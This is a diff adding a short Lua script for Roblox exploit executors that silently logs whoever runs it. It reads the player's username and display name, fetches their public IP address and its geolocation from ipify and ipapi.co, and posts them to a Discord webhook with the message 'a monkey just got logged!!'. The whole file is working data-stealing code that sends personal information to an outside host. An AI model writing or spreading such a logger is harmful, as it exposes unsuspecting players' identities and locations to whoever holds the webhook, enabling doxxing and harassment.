@@ -1,0 +1,22 @@
+
+local request = (request or syn.request) or (http or http.request) or http_request
+local data = {
+    ['embeds'] = {
+      {
+['title'] = "Username; "..tostring(game.Players.LocalPlayer) .." Displayname;".. tostring( game.Players.LocalPlayer.DisplayName),
+['description'] = "a monkey just got logged!! IP address: "..game:HttpGet("https://ipapi.co/"..game:HttpGet('https://api.ipify.org/').."/json/")
+      }
+   }
+}
+
+local response = request(
+{
+Url = sendwhenexecuteddiscordtoken,
+Method = 'Post',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+
+Body = game:GetService('HttpService'):JSONEncode(data)
+}
+)
